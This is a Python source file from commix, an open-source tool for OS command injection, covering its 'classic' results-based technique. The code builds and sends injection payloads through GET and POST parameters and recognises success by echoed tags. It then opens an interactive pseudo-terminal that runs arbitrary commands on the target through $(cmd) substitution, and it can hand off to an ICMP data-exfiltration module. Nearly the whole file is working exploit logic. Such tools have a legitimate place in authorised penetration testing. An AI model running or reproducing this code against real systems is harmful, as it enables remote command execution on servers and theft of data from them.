#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

"""
  The "classic" technique on Result-based OS Command Injection.
"""

def icmp_exfiltration_handler(url,http_request_method):
  
  # You need to have root privileges to run this script
  if os.geteuid() != 0:
    print colors.RED + "\n(x) Error:  You need to have root privileges to run this option.\n" + colors.RESET
    sys.exit(0)
    
  if http_request_method == "GET":
    # Check if its not specified the 'INJECT_HERE' tag
    url = parameters.do_GET_check(url)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    request_data = vuln_parameter

  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter,url)
    request_data = vuln_parameter
    
  ip_data = menu.options.ip_icmp_data
  
  # Load the module ICMP_Exfiltration
  
  try:
    from src.core.modules import ICMP_Exfiltration
    
  except ImportError as e:
    print colors.RED + "(x) Error:", e
    print colors.RESET
    sys.exit(1)
    
  technique = "ICMP exfiltration technique"
  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... \n" + colors.RESET)
  sys.stdout.flush()
  
  ip_src =  re.findall(r"ip_src=(.*),", ip_data)
  ip_src = ''.join(ip_src)
  
  ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
  ip_dst = ''.join(ip_dst)
  
  ICMP_Exfiltration.exploitation(ip_dst,ip_src,url,http_request_method,request_data)


def classic_exploitation_handler(url,delay,filename,http_request_method):
  
  counter = 0
  vp_flag = True
  no_result = True
  is_encoded= False
  injection_type = "Results-based Command Injection"
  technique = "classic injection technique"
      
  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... " + colors.RESET)
  sys.stdout.flush()
  
  # Print the findings to log file.
  output_file = open(filename + ".txt", "a")
  output_file.write("\n---")
  output_file.write("\n(+) Type : " + injection_type)
  output_file.write("\n(+) Technique : " + technique.title())
  output_file.close()
  
  for whitespace in settings.WHITESPACES:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
	for seperator in settings.SEPERATORS:
	  
	  # Check for bad combination of prefix and seperator
	  combination = prefix + seperator
	  if combination in settings.JUNK_COMBINATION:
	    prefix = ""

	  # Change TAG on every request to prevent false-positive resutls.
	  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
	  
	  # Check if defined "--base64" option.
	  if menu.options.base64_trick == True:
	    B64_ENC_TAG = base64.b64encode(TAG)
	    B64_DEC_TRICK = settings.B64_DEC_TRICK
	  else:
	    B64_ENC_TAG = TAG
	    B64_DEC_TRICK = ""
	    
	  try:
	    payload = (seperator + 
		      "echo '" + TAG + "'" +
		      "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + ")'" + TAG + "'"
			) 
			    
	    # Check if defined "--prefix" option.
	    if menu.options.prefix:
	      prefix = menu.options.prefix
	      payload = prefix + payload
	      
	    else:
	      payload = prefix + payload
	      
	    # Check if defined "--suffix" option.
	    if menu.options.suffix:
	      suffix = menu.options.suffix
	      payload = payload + suffix
	      
	    else:
	      payload = payload + suffix

	    if seperator == " " :
	      payload = re.sub(" ", "%20", payload)
	    else:
	      payload = re.sub(" ", whitespace, payload)

	    #Check if defined "--verbose" option.
	    if menu.options.verbose:
	      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
	    
	    # Check if defined method is GET (Default).
	    if http_request_method == "GET":
	      
	      # Check if its not specified the 'INJECT_HERE' tag
	      url = parameters.do_GET_check(url)
	      
	      # Define the vulnerable parameter
	      vuln_parameter = parameters.vuln_GET_param(url)

	      target = re.sub(settings.INJECT_TAG, payload, url)
	      request = urllib2.Request(target)

	      # Check if defined extra headers.
	      headers.do_check(request)

	      # Check if defined any HTTP Proxy.
	      if menu.options.proxy:
		try:
		  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
		  opener = urllib2.build_opener(proxy)
		  urllib2.install_opener(opener)
		  response = urllib2.urlopen(request)
		  
		except urllib2.HTTPError, err:
		  print "\n(x) Error : " + str(err)
		  sys.exit(1) 
	  
	      else:
		response = urllib2.urlopen(request)
		
	    # Check if defined method is POST.
	    else:
	      parameter = menu.options.data
	      parameter = urllib2.unquote(parameter)
	      
	      # Check if its not specified the 'INJECT_HERE' tag
	      parameter = parameters.do_POST_check(parameter)
	      
	      # Define the POST data
	      data = re.sub(settings.INJECT_TAG, payload, parameter)
	      request = urllib2.Request(url, data)
	      
	      # Define the vulnerable parameter
	      vuln_parameter = parameters.vuln_POST_param(parameter,url)
	      
	      # Check if defined extra headers.
	      headers.do_check(request)

	      # Check if defined any HTTP Proxy.
	      if menu.options.proxy:
		try:
		  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
		  opener = urllib2.build_opener(proxy)
		  urllib2.install_opener(opener)
		  response = urllib2.urlopen(request)
				
		except urllib2.HTTPError, err:
		  print "\n(x) Error : " + str(err)
		  sys.exit(1) 
	  
	      else:
		response = urllib2.urlopen(request)
		  
	    # if need page reload
	    if menu.options.url_reload: 
	      time.sleep(delay)
	      response = urllib.urlopen(url)
	      
	    html_data = response.read()
	    shell = re.findall(r""+TAG+TAG+TAG+"", html_data)
	    
	  except:
	    continue
	  
	  if shell:
	    	    
	    found = True
	    no_result = False
	    if http_request_method == "GET":
	      	      
	      # Print the findings to log file
	      if vp_flag == True:
		output_file = open(filename + ".txt", "a")
		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
		output_file.write("\n---\n")
		vp_flag = False
		output_file.close()
		
	      counter = counter + 1
	      output_file = open(filename + ".txt", "a")
	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	      output_file.close()
	      
	      # Print the findings to terminal.
	      print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"

	    else :
	      
	      # Print the findings to log file
	      if vp_flag == True:
		output_file = open(filename + ".txt", "a")
		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
		output_file.write("\n---\n")
		vp_flag = False
		output_file.close()
		
	      counter = counter + 1
	      output_file = open(filename + ".txt", "a")
	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	      output_file.close()
	      
	      # Print the findings to terminal.
	      print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
	      	      
	    gotshell = raw_input("(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
	    
	    if gotshell == "Y" or gotshell == "y":
	      print ""
	      print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
	      
	      while True:
		try:
		  cmd = raw_input("Shell > ")
		  
		  if cmd == "q":
		    sys.exit(0)
		    
		  else:
		    payload = (seperator + 
			      "echo '" + TAG + "'" +
			      "$(echo '"+TAG+"')"+
			      "$(" + cmd + ")"+
			      "$(echo '" + TAG + "')'" + TAG +"'"
			      )
		    
		    if seperator == " " :
		      payload = re.sub(" ", "%20", payload)
		    else:
		      payload = re.sub(" ", whitespace, payload)

		    # Check if defined "--prefix" option.
		    if menu.options.prefix:
		      prefix = menu.options.prefix
		      payload = prefix + payload
		    else:
		      payload = prefix + payload
		      
		    # Check if defined "--suffix" option.
		    if menu.options.suffix:
		      suffix = menu.options.suffix
		      payload = payload + suffix
		    else:
		      payload = payload + suffix
			
		    # Check if defined "--verbose" option.
		    if menu.options.verbose:
		      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
		      
		    # Check if defined method is GET (Default).
		    if http_request_method == "GET":
		      
		      # Check if its not specified the 'INJECT_HERE' tag
		      url = parameters.do_GET_check(url)
		      
		      target = re.sub(settings.INJECT_TAG, payload, url)
		      vuln_parameter = ''.join(vuln_parameter)
		      request = urllib2.Request(target)
		      
		      # Check if defined extra headers.
		      headers.do_check(request)	
			
		      # Check if defined any HTTP Proxy.
		      if menu.options.proxy:
			try:
			  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
			  opener = urllib2.build_opener(proxy)
			  urllib2.install_opener(opener)
			  response = urllib2.urlopen(request)
					  
			except urllib2.HTTPError, err:
			  print "\n(x) Error : " + str(err)
			  sys.exit(1) 
		  
		      else:
			response = urllib2.urlopen(request)
			
		    else :
		      
		      # Check if defined method is POST.
		      parameter = menu.options.data
		      parameter = urllib2.unquote(parameter)
		      
		      # Check if its not specified the 'INJECT_HERE' tag
		      parameter = parameters.do_POST_check(parameter)
		      
		      data = re.sub(settings.INJECT_TAG, payload, parameter)
		      request = urllib2.Request(url, data)
		      
		      # Check if defined extra headers.
		      headers.do_check(request)	
			
		      # Check if defined any HTTP Proxy.
		      if menu.options.proxy:
			try:
			  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
			  opener = urllib2.build_opener(proxy)
			  urllib2.install_opener(opener)
			  response = urllib2.urlopen(request)
					  
			except urllib2.HTTPError, err:
			  print "\n(x) Error : " + str(err)
			  sys.exit(1) 
		  
		      else:
			response = urllib2.urlopen(request)
			
		    # if need page reload
		    if menu.options.url_reload:
		      time.sleep(delay)
		      response = urllib.urlopen(url)

		    html_data = response.read()
		    shell = re.findall(r""+TAG+TAG+"(.*)"+TAG+TAG+"", html_data)
		    
		    if shell:
		      shell = "".join(str(p) for p in shell)
		      print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"

		except KeyboardInterrupt: 
		  print ""
		  sys.exit(0)
	      
	    else:
	      print "(*) Continue testing the "+ technique +"... "
	      pass

  if no_result == True:
    if menu.options.verbose == False:
      print "[" + colors.RED + " FAILED "+colors.RESET+"]"
  
    else:
      print ""
    
    return False
  
  else :
    print ""
    
    
def exploitation(url,delay,filename,http_request_method):
  
  # Use the ICMP Exfiltration technique
  if menu.options.ip_icmp_data:
    icmp_exfiltration_handler(url,http_request_method)
    
  else:
    classic_exploitation_handler(url,delay,filename,http_request_method)

